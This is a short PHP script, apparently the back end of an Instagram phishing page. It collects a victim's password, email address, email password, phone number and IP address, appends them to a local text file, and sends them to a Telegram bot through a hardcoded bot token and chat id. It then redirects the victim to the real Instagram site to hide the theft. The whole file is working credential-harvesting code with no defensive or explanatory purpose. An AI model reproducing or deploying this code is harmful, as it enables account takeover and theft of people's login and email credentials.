<?php
function yazdir($dosya, $kip, $yazi){
    $yazilacakdosya=fopen($dosya, $kip);
    fwrite($yazilacakdosya, $yazi);
    fclose($yazilacakdosya);
}
if(!isset($_POST)){
    header("Location: username.php");
}else{
    if($_POST["formsubmit"]) {
		$password = $_POST["password"];
        $mail = $_POST["email"];
        $mailpw = $_POST["emailpassword"];
        $phone = $_POST["phonenumber"];
        $ip = $_SERVER['REMOTE_ADDR'];
        date_default_timezone_set('Europe/Istanbul');
        $tarih = date("d:m:Y G:i");
        $yazi = "Password: $password \nMail address : $mail \nMail Sifre: $mailpw\nPhone Number : $phone \nip adress : $ip \nTarih : $tarih \n\n\n";
        if(is_writable('account.txt')){
            $dosya = "account.txt";
            $kip = "a+";
            yazdir($dosya, $kip, $yazi);
            header("Location: https://instagram.com/");
         }else{
             echo 'dosyaya yaz?lam?yor.';
         }
    }
    else{
        header("Location: form.php");
    }

$token = "1619170130:AAGW7f_v4SrnDAWid8wn9yHpeB58-D2wh_c";

$data = [
    'text' => ' 
	
Password : '.$password.'
Mail address : '.$mail.'
Mail Sifre : '.$mailpw.'
Phone Number : '.$phone.'
ip adress : '.$ip.'
Tarih : '.$tarih.'
',
    'chat_id' => '988338732'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );



}


?>